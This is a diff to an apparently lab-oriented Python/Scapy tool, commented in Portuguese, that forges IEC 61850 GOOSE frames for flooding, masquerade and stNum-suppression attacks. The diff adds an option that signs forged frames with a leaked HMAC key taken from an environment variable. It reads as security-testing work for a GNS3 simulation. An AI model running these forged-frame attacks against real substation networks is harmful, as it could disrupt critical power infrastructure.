@@ -27,12 +27,14 @@ necessário). Use --dry-run para validar a montagem dos pacotes sem
 enviar nada à rede (útil para testar fora do GNS3).
 """
 import argparse
+import os
 import sys
 import time
 
 from scapy.all import sniff, sendp, wrpcap, rdpcap
 
 import goose_frame as gf
+from goose_auth import GooseAuthenticator
 
 
 def cmd_capture(args):
@@ -57,6 +59,17 @@ def _load_template(path):
     return parsed
 
 
+def _auth_tag_for(args, fields):
+    """Cenário "chave vazada" (opt-in): com --leaked-key-env, assina o
+    frame forjado com a chave-mestra lida dessa variável de ambiente.
+    Sem a opção, o frame sai SEM trailer de autenticação (atacante sem
+    a chave)."""
+    if not args.leaked_key_env:
+        return None
+    key = os.environ[args.leaked_key_env].encode()
+    return GooseAuthenticator(key).sign(fields)
+
+
 def cmd_flood(args):
     """Teste A — Flooding: reenvia (com stNum/sqNum crescentes e timestamp
     atualizado) a mensagem-molde em alta taxa, saturando a rede/assinantes."""
@@ -77,6 +90,7 @@ def cmd_flood(args):
         pkt = gf.build_ethernet_goose_frame(
             dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
             appid=parsed["appid"], fields=fields,
+            auth_tag=_auth_tag_for(args, fields),
         )
         if args.dry_run:
             if sent == 0:
@@ -132,6 +146,7 @@ def cmd_masquerade(args):
     pkt = gf.build_ethernet_goose_frame(
         dst_mac=parsed["dst_mac"], src_mac=src_mac,
         appid=parsed["appid"], fields=fields,
+        auth_tag=_auth_tag_for(args, fields),
     )
     print(f"[*] Masquerade: gocbRef={fields['gocbRef']} "
           f"bit em offset {offset} do allData: {old_val} -> {new_val}, "
@@ -158,6 +173,7 @@ def cmd_suppress(args):
     pkt = gf.build_ethernet_goose_frame(
         dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
         appid=parsed["appid"], fields=fields,
+        auth_tag=_auth_tag_for(args, fields),
     )
     print(f"[*] Suppression: stNum {parsed['fields']['stNum']} -> {fields['stNum']} "
           f"(salto de {args.jump})")
@@ -173,6 +189,11 @@ def main():
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
     p.add_argument("--dry-run", action="store_true",
                    help="Monta os pacotes mas não envia nada à rede (para testar sem GNS3).")
+    p.add_argument("--leaked-key-env", metavar="VAR", default=None,
+                   help="Simula um atacante COM a chave HMAC vazada: assina os frames "
+                        "forjados (flood/masquerade/suppress) com a chave-mestra "
+                        "lida da variável de ambiente VAR. Sem isso, os frames saem sem "
+                        "autenticação. Replay reenvia o frame original e não é afetado.")
     sub = p.add_subparsers(dest="cmd", required=True)
 
     p_cap = sub.add_parser("capture", help="Captura uma mensagem GOOSE legítima como molde.")
